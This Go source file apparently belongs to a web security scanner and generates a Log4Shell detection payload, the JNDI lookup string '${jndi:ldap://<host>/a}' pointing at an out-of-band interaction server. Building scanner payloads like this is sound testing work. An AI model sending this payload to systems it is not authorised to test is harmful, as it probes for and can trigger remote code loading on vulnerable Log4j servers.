package payloads

import (
	"fmt"
	"github.com/pyneda/sukyan/lib/integrations"
	"regexp"
)

type Log4ShellPayload struct {
	Value             string
	InteractionDomain string
	InteractionFullID string
}

// GetValue gets the payload value as string
func (p Log4ShellPayload) GetValue() string {
	return p.Value
}

// MatchAgainstString Checks if the payload match against a string
func (p Log4ShellPayload) MatchAgainstString(text string) (bool, error) {
	return regexp.MatchString(p.Value, text)
}

func (p Log4ShellPayload) GetInteractionData() PayloadInteractionData {
	return PayloadInteractionData{
		InteractionDomain: p.InteractionDomain,
		InteractionFullID: p.InteractionFullID,
	}
}

func GenerateLog4ShellPayload(im *integrations.InteractionsManager) (payloads PayloadInterface) {
	address := im.GetURL()
	value := fmt.Sprintf("${jndi:ldap://%s/a}", address.URL)
	payload := Log4ShellPayload{
		Value:             value,
		InteractionDomain: address.URL,
		InteractionFullID: address.ID,
	}
	return payload
}
